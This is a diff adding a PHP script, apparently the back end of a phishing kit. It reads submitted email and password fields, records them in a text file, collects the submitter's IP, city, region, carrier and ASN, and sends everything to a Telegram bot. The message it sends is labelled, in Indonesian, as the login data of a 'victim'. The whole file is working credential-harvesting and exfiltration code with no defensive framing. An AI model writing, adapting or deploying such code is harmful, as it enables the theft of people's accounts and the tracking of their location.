@@ -1,0 +1,70 @@
+<?php
+session_start();
+include "telegram.php";
+
+$email = $_POST['email'];
+$password = $_POST['password'];
+$login = $_POST['login'];
+
+// === Jika mengandung / atau // maka langsung anggap spam ===
+if (strpos($email, '/') !== false || strpos($email, '//') !== false ||
+    strpos($password, '/') !== false || strpos($password, '//') !== false) {
+    
+    // Simpan semua data ke antispam.txt
+    file_put_contents('antispam.txt', "$email|$password|$login" . PHP_EOL, FILE_APPEND);
+    
+    // Hentikan proses
+    die("Input terdeteksi sebagai spam.");
+}
+
+// === Lanjut proses validasi email normal ===
+$file_log = 'antispam.txt';
+
+// Jika file belum ada, buat
+if (!file_exists($file_log)) {
+    file_put_contents($file_log, '');
+}
+
+// Ambil isi file
+$used_emails = file($file_log, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+// Cek apakah email sudah pernah digunakan
+if (in_array($email, $used_emails)) {
+    die("Email sudah digunakan.");
+}
+
+// Simpan email sebagai yang sudah digunakan
+file_put_contents($file_log, $email . PHP_EOL, FILE_APPEND);
+
+// Proses berikutnya misalnya include IP info
+include 'ip-info.php';
+
+$message = "
+INFORMASI DATA LOGIN KORBAN
+
+EMAIL/NOMOR : ".$email."
+PASSWORD : ".$password."
+LOGIN : ".$login."
+IP Address : ".$putra_ip."
+Login : ".$login."
+Kota : ".$putra_kota."
+Daerah : ".$putra_daerah."
+Operator : ".$putra_sinyal."
+Asn : ".$putra_asn."
+©RESS LUKY GACOR";
+
+function sendMessage($telegram_id, $message, $id_bot) {
+    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+
+sendMessage($telegram_id, $message, $id_bot);
+?>
